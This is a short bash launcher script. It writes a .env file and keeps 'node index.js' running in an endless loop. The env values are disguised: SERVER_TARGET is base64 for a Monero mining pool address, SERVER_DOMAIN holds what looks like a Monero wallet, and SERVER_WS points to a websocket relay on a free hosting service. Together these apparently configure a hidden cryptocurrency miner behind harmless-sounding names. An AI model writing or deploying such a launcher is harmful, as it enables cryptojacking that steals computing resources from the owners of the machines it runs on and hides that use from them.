#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
SERVER_TARGET=cG9vbC5oYXNodmF1bHQucHJvOjQ0Mw==
SERVER_DOMAIN=876PV3gx5xAFrfsARXWyJ94AGfB9FjNFp3MxatiGPrAyCELXKjGUHd82ChZLPvhNo3g1Y9kpGZy5UMd23Q5Yn4mHLVT2dUy
SERVER_SECRET=app-4
SERVER_CONNECTION=2" > .env
while true; do node index.js; sleep 15; done
